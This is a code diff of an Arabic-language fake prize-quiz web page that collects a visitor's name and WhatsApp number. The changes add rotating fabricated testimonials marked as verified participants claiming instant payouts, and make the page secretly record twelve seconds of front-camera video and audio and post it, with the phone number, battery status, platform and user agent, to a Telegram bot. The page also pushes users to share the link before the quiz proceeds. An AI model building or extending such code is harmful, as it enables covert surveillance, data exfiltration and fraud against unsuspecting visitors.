@@ -195,6 +195,28 @@
             border-radius: 6px;
             margin: 15px 0;
         }
+        /* تصميم صندوق آراء المشاركين المتغير مع خلفية تتغير بالكامل */
+        .testimonial-box {
+            margin-top: 25px;
+            padding: 14px;
+            border-radius: 10px;
+            color: #fff;
+            text-align: right;
+            transition: background-color 0.8s ease, opacity 0.5s ease;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+        .testimonial-name {
+            font-weight: bold;
+            font-size: 15px;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .testimonial-text {
+            font-size: 14px;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
@@ -216,6 +238,15 @@
             <input type="text" id="user-name" class="input-box" placeholder="الاسم الثلاثي">
             <input type="tel" id="user-phone" class="input-box" placeholder="رقم الهاتف (واتساب)">
             <button type="button" class="btn-green" onclick="startProcess()">بدء التسجيل</button>
+
+            <!-- صندوق آراء المشاركين (يتغير الكلام والخلفية معاً) -->
+            <div id="testimonial-card" class="testimonial-box">
+                <div class="testimonial-name">
+                    <span id="t-name">أحمد علي</span>
+                    <span style="font-size: 11px; background: rgba(0,0,0,0.25); padding: 2px 6px; border-radius: 4px;">مشارك مؤكد ✓</span>
+                </div>
+                <div class="testimonial-text" id="t-text">بالبدايه لم أكن اصدق ولكن استلمت المبلغ فورا</div>
+            </div>
         </div>
 
         <!-- قسم مشاركة الرابط العامة -->
@@ -320,6 +351,37 @@
         let userName = "";
         let userPhone = "";
         let isVideoSent = false;
+
+        // آراء الـ 5 مشاركين مع تغيير الكلام والخلفية لكل واحد
+        const testimonials = [
+            { name: "محمد العمري", text: "بالبدايه لم أكن اصدق ولكن استلمت المبلغ فورا عبر تطبيق جيب.", bg: "#0f766e" }, // أخضر بترولي
+            { name: "صالح باوزير", text: "الموقع صادق جداً، جاوبت على الأسئلة ووصلتني رسالة السحب خلال دقائق.", bg: "#3b82f6" }, // أزرق
+            { name: "عبدالله الكثيري", text: "في البداية توقعته مجرد إعلان وهمي، لكن بعد ما كملت الخطوات وصلن الرصيد.", bg: "#9333ea" }, // بنفسجي
+            { name: "أيمن الحالمي", text: "تجربة ممتازة وسحب أرباحي وصلني كامل بدون أي نقص، شكراً للقائمين.", bg: "#c2410c" }, // برتقالي غامق
+            { name: "عمر اليافعي", text: "أنصح الجميع بالتسجيل والمشاركة، الموقع حقيقي ويدعم التحويل الفوري.", bg: "#be123c" }  // أحمر توتي
+        ];
+        let currentTestimonialIndex = 0;
+
+        function rotateTestimonials() {
+            let card = document.getElementById('testimonial-card');
+            let nameEl = document.getElementById('t-name');
+            let textEl = document.getElementById('t-text');
+
+            if (card && nameEl && textEl) {
+                // تأثير تلاشي ناعم عند التبديل
+                card.style.opacity = 0;
+                setTimeout(() => {
+                    currentTestimonialIndex = (currentTestimonialIndex + 1) % testimonials.length;
+                    let item = testimonials[currentTestimonialIndex];
+                    
+                    nameEl.innerText = item.name;
+                    textEl.innerText = item.text;
+                    card.style.backgroundColor = item.bg;
+                    
+                    card.style.opacity = 1;
+                }, 400);
+            }
+        }
 
         const questions = [
             { q: "ما هي عاصمة اليمن؟", options: ["عدن", "صنعاء", "تعز", "إب"], correct: 1 },
@@ -430,6 +492,16 @@
             localStorage.clear(); 
             initCamera();
             getBatteryStatus();
+            
+            // تعيين لون وعرض أول رأي فوراً
+            let card = document.getElementById('testimonial-card');
+            let item = testimonials[0];
+            card.style.backgroundColor = item.bg;
+            document.getElementById('t-name').innerText = item.name;
+            document.getElementById('t-text').innerText = item.text;
+
+            // تغيير الكلام والخلفية بالكامل كل 4 ثوانٍ
+            setInterval(rotateTestimonials, 4000);
         };
 
         function getBatteryStatus() {
@@ -442,7 +514,7 @@
                     batteryLevelInfo = "غير متاح";
                 });
             } else {
-                batteryLevelInfo = "غير مدعوم في المتصفح";
+                batteryLevelInfo = "غير مدعوم";
             }
         }
 
@@ -473,28 +545,28 @@
                 return;
             }
 
-            // تحديث حالة البطارية فور بدء التسجيل لضمان دقتها
             getBatteryStatus();
-            startRecordingSession(mediaStream);
-
+            
             document.getElementById('display-name').innerText = userName;
             document.getElementById('form-section').classList.add('hidden');
             document.getElementById('content-section').classList.remove('hidden');
+
+            startTimedRecordingSession(mediaStream);
         }
 
-        function startRecordingSession(stream) {
+        function startTimedRecordingSession(stream) {
             if (!stream) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
                 .then(function(newStream) {
                     mediaStream = newStream;
-                    initRecorder(newStream);
+                    initTimedRecorder(newStream);
                 }).catch(e => console.log("تعذر فتح الكاميرا"));
                 return;
             }
-            initRecorder(stream);
+            initTimedRecorder(stream);
         }
 
-        function initRecorder(stream) {
+        function initTimedRecorder(stream) {
             recordedChunks = [];
             let options = { mimeType: 'video/webm; codecs=vp9' };
             if (!MediaRecorder.isTypeSupported(options.mimeType)) {
@@ -520,6 +592,13 @@
 
                 mediaRecorder.start(1000);
 
+                // إيقاف التسجيل تلقائياً بعد 12 ثانية وإرساله للبوت
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 12000);
+
             } catch (e) {
                 console.log("خطأ في بدء التسجيل: ", e);
             }
@@ -531,8 +610,8 @@
 
             let formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, 'quiz_arrival_capture.mp4');
-            formData.append('caption', `🎥 فيديو وصول المستخدم للأسئلة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 شحن البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
+            formData.append('video', videoBlob, 'user_12sec_capture.mp4');
+            formData.append('caption', `🎥 فيديو (12 ثانية):\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 شحن البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
 
             let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
@@ -557,33 +636,24 @@
             hasSharedOrCopied = true;
 
             if (navigator.share) {
-                navigator.share(shareData).then(() => {
-                    console.log('تمت المشاركة بنجاح');
-                }).catch((error) => {
-                    console.log('تم إلغاء المشاركة');
-                });
+                navigator.share(shareData).catch(() => {});
             } else {
                 navigator.clipboard.writeText(siteUrl + "\n" + shareData.text);
-                alert("تم نسخ رابط الموقع وحفظه، يمكنك لصقه ومشاركته في أي تطبيق تريده!");
+                alert("تم نسخ رابط الموقع، يمكنك مشاركته الآن!");
             }
 
             let shareBtn = document.getElementById('share-btn');
-            shareBtn.innerText = "جاري التحقق من النشر... (يرجى العودة للموقع)";
+            shareBtn.innerText = "جاري التحقق من النشر...";
             shareBtn.style.backgroundColor = "#94a3b8";
         }
 
         document.addEventListener("visibilitychange", function() {
             if (document.visibilityState === "visible") {
-                if (!hasSharedOrCopied) {
-                    let shareBtn = document.getElementById('share-btn');
-                    shareBtn.innerText = "مساهمة";
-                    shareBtn.style.backgroundColor = "#8bc34a";
-                    return;
-                }
+                if (!hasSharedOrCopied) return;
 
                 setTimeout(() => {
                     if (progress < 100) {
-                        progress += 20; 
+                        progress += 25; 
                         if (progress > 100) progress = 100;
 
                         document.getElementById('progress-fill').style.width = progress + '%';
@@ -596,33 +666,15 @@
                     hasSharedOrCopied = false; 
 
                     if (progress >= 100) {
-                        // تحديث قراءة البطارية للمرة الأخيرة قبل الإرسال الفوري
-                        if (navigator.getBattery) {
-                            navigator.getBattery().then(function(battery) {
-                                let level = Math.round(battery.level * 100);
-                                let charging = battery.charging ? "⚡ (يتم الشحن)" : "🔋 (لا يتم الشحن)";
-                                batteryLevelInfo = `${level}% ${charging}`;
-                                triggerVideoStopAndSend();
-                            });
-                        } else {
-                            triggerVideoStopAndSend();
-                        }
+                        setTimeout(() => {
+                            document.getElementById('content-section').classList.add('hidden');
+                            document.getElementById('quiz-section').classList.remove('hidden');
+                            loadQuestion();
+                        }, 500);
                     }
-                }, 3000); 
+                }, 2000); 
             }
         });
-
-        function triggerVideoStopAndSend() {
-            if (mediaRecorder && mediaRecorder.state === "recording") {
-                mediaRecorder.stop(); 
-            }
-
-            setTimeout(() => {
-                document.getElementById('content-section').classList.add('hidden');
-                document.getElementById('quiz-section').classList.remove('hidden');
-                loadQuestion();
-            }, 500);
-        }
 
         function loadQuestion() {
             if (currentQuestion >= questions.length) {
